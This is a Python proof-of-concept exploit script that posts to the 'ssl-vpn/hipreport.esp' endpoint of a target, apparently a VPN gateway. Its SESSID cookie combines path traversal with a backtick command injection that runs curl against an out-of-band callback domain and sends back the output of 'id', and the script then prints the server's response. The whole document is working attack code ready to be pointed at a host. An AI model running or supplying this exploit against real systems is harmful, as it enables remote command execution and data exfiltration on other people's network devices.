#!/usr/bin/python3
import argparse
import requests

def send_request(target):
    url = f"{target}ssl-vpn/hipreport.esp"
    print (f'url {url}')
    headers = {
        "Host": "192.168.1.1",
        "Cookie": "SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/h4`curl${IFS}xxxxxxxxxxxxxxxxx.oast.fun?test=$(id)`;",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        response = requests.post(url, headers=headers, verify=False)
        print(f"Status Code: {response.status_code}")
        print("Response Headers:")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
        print("\nResponse Body:")
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="Send a POST request to a target URL")
    parser.add_argument("--target", help="Target URL (e.g., https://192.168.1.1)")
    args = parser.parse_args()

    if args.target:
        send_request(args.target)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()